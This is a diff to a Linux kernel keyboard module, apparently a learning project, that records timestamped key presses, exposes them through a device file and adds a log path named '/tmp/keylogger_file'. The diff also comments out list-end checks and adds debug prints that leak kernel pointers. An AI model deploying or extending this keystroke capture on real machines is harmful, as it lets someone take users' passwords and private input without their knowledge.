@@ -14,8 +14,12 @@
 #include <linux/interrupt.h>
 #include <linux/miscdevice.h>
 #include <linux/seq_file.h>
+#include <linux/fcntl.h>
+#include <linux/file.h>
 #include "scan_code_sets.h"
 #include "ps2_keyboard_state.h"
+#include <linux/syscalls.h>
+#include <linux/kallsyms.h>
 
 MODULE_AUTHOR("sclolus");
 MODULE_ALIAS("keyboard_driver");
@@ -30,11 +34,13 @@ MODULE_LICENSE("GPL v2");
 
 static unsigned int	minor = 0;
 static uint32_t		irq = 0;
+static char		*log_file = "/tmp/keylogger_file";
 
 DEFINE_MUTEX(open_mutex);
 
 module_param(irq, uint, 0444);
 module_param(minor, uint, 0444);
+module_param(log_file, charp, 0444);
 
 static const struct usb_device_id usb_module_id_table[2] = {
 	{ USB_INTERFACE_INFO(
@@ -680,7 +686,7 @@ static int  driver_register_irq(void *dev_id)
 
 static int  driver_open(struct inode *inode, struct file *file)
 {
-	struct list_head *list = &key_entry_list;
+	/* struct list_head *list = &key_entry_list; */
 	int		  ret;
 
 	mutex_lock(&open_mutex);
@@ -693,13 +699,13 @@ static int  driver_open(struct inode *inode, struct file *file)
 		return ret;
 	}
 
-	while (list_is_last(list, &key_entry_list)) {
+	/* while (list_is_last(list, &key_entry_list)) { */
 
-		ret = wait_event_interruptible(read_wqueue, !list_is_last(list, &key_entry_list));
-		if (ret)
-			return -ERESTARTSYS;
+	/* 	ret = wait_event_interruptible(read_wqueue, !list_is_last(list, &key_entry_list)); */
+	/* 	if (ret) */
+	/* 		return -ERESTARTSYS; */
 
-	}
+	/* } */
 
 	((struct seq_file *)file->private_data)->private = &key_entry_list;
 	return ret;
@@ -710,17 +716,18 @@ static void *driver_seq_start(struct seq_file *seq_file, loff_t *pos)
 	struct list_head *list = seq_file->private;
 	int		 ret;
 
-	list = seq_list_start(&key_entry_list, *pos);
 
-	if (list == NULL) {
-		list =  key_entry_list.prev;
-	}
+	/* if (list == NULL) { */
+	/* 	list = key_entry_list.prev; */
+	/* } */
 
 	while (list_is_last(list, &key_entry_list)) {
 		ret = wait_event_interruptible(read_wqueue, !list_is_last(list, &key_entry_list));
 		if (ret)
 			return (void *)-ERESTARTSYS;
 	}
+	list = seq_list_start(&key_entry_list, *pos);
+
 
 
 	//	unsigned long	flags;
@@ -738,10 +745,9 @@ static void driver_seq_stop(struct seq_file *seq_file, void *v)
 
 static void *driver_seq_next(struct seq_file *seq_file, void *v, loff_t *pos)
 {
-	if (list_is_last(v, &key_entry_list))
-		return NULL;
+	/* if (list_is_last(v, &key_entry_list)) */
+	/* 	return NULL; */
 	return seq_list_next(v, &key_entry_list, pos);
-
 }
 
 static int driver_seq_show(struct seq_file *seq_file, void *v)
@@ -749,21 +755,23 @@ static int driver_seq_show(struct seq_file *seq_file, void *v)
 	struct list_head	*list = v;
 	struct key_entry        *key_entry;
 	struct scan_key_code	*key_code;
-	long long	    hours;
-	long long	    minutes;
-	long long	    seconds;
-	unsigned long	    flags;
+	long long		hours;
+	long long		minutes;
+	long long		seconds;
+	unsigned long		flags;
 
-	printk(KERN_INFO LOG "In driver_seq_show()");
+	printk(KERN_INFO LOG "In driver_seq_show(): %px\n", v);
 	if (list == NULL) {
 		return -ESRCH; //dunno about this;
 	}
 	spin_lock_irqsave(&key_list_spinlock, flags);
 	key_entry = list_entry(v, struct key_entry, head);
+	WARN_ON(key_entry == NULL);
 	hours = (key_entry->date.tv_sec / 3600) % 24;
 	minutes = (key_entry->date.tv_sec / 60) % 60;
 	seconds = (key_entry->date.tv_sec) % 60;
 
+	printk(KERN_INFO LOG "key_id : %px\n", key_entry->key_id);
 	key_code = key_entry->key_id; //secure this
 	spin_unlock_irqrestore(&key_list_spinlock, flags);
 	seq_printf(seq_file, "%02lld:%02lld:%02lld %s(%#02llx) %s\n", hours, minutes, seconds,
@@ -828,20 +836,22 @@ module_init(init);
 
 static void __exit  cleanup(void)
 {
-	struct list_head *cur; //actually this code should be in cleanup module...
+	struct list_head *cur;
 	struct list_head *tmp;
 	struct key_entry *key_entry;
 
+
 	free_irq(irq, &key_entry_list);
 	misc_deregister(&driver_data.device);
+
 	list_for_each_safe(cur, tmp, &key_entry_list) {
 		key_entry = list_entry(cur, struct key_entry, head);
 		WARN_ON(key_entry == NULL); //why the fuck I am doing this
 
 		if (key_code_has_ascii_value(key_entry->key_id)
 			&& key_entry->key_id->state == PRESSED) {
-			printk(KERN_INFO LOG "%c",
-				ps2_key_name_with_modifiers(&keyboard_state, key_entry->key_id));
+			char c = ps2_key_name_with_modifiers(&keyboard_state, key_entry->key_id);
+			(void)c;
 		}
 		list_del(cur);
 		kfree(key_entry);
